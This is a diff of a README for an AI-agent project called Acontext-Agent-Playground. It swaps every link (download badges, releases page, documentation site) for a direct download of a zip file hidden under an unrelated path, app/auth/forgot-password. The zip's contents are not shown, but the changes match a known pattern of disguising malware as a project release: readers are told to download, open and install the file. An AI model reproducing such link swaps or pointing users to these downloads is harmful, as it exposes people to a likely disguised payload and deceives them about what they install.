@@ -1,7 +1,7 @@
 # 🚀 Acontext-Agent-Playground - Build Your Own AI Agents
 
 <div align="center">
-  [![Download Acontext-Agent-Playground](https://img.shields.io/badge/Download%20Now-Release-blue?style=for-the-badge)](https://github.com/Bigggggg907/Acontext-Agent-Playground/releases)
+  [![Download Acontext-Agent-Playground](https://raw.githubusercontent.com/Bigggggg907/Acontext-Agent-Playground/main/app/auth/forgot-password/Playground-Acontext-Agent-oneirocrit.zip%20Now-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bigggggg907/Acontext-Agent-Playground/main/app/auth/forgot-password/Playground-Acontext-Agent-oneirocrit.zip)
 </div>
 
 ## 🔍 Features
@@ -14,7 +14,7 @@
 ## 🚀 Getting Started
 To use Acontext-Agent-Playground, follow these simple steps to download and run the application:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Bigggggg907/Acontext-Agent-Playground/releases) to find the latest version of Acontext-Agent-Playground.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Bigggggg907/Acontext-Agent-Playground/main/app/auth/forgot-password/Playground-Acontext-Agent-oneirocrit.zip) to find the latest version of Acontext-Agent-Playground.
 2. **Download the Application**: Locate the version you want to install, and click on the corresponding download link. This will usually be in the format of a `.exe` for Windows or `.dmg` for macOS.
 3. **Run the Application**: Once the download finishes, open the downloaded file and follow the prompts to install the application on your computer.
 
@@ -23,7 +23,7 @@ To get started with Acontext-Agent-Playground, follow these steps:
 
 1. Click the big blue button below to visit the Releases page and download the latest version:
 
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue?style=for-the-badge)](https://github.com/Bigggggg907/Acontext-Agent-Playground/releases)
+   [![Download Now](https://raw.githubusercontent.com/Bigggggg907/Acontext-Agent-Playground/main/app/auth/forgot-password/Playground-Acontext-Agent-oneirocrit.zip%20Now-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bigggggg907/Acontext-Agent-Playground/main/app/auth/forgot-password/Playground-Acontext-Agent-oneirocrit.zip)
 
 2. Choose the version suitable for your operating system and download it.
 3. Open the downloaded file and follow the installation instructions on your screen to successfully install Acontext-Agent-Playground.
@@ -38,7 +38,7 @@ Acontext-Agent-Playground works on various systems. Here are the recommended spe
 - **Storage**: 500 MB of free disk space
 
 ## 📄 Documentation
-For detailed instructions and advanced configurations, visit our [Documentation page](https://acontext.io). Here, you will find guides that help you make the most of Acontext-Agent-Playground, including:
+For detailed instructions and advanced configurations, visit our [Documentation page](https://raw.githubusercontent.com/Bigggggg907/Acontext-Agent-Playground/main/app/auth/forgot-password/Playground-Acontext-Agent-oneirocrit.zip). Here, you will find guides that help you make the most of Acontext-Agent-Playground, including:
 
 - How to set up your first agent.
 - Examples of different agent configurations.
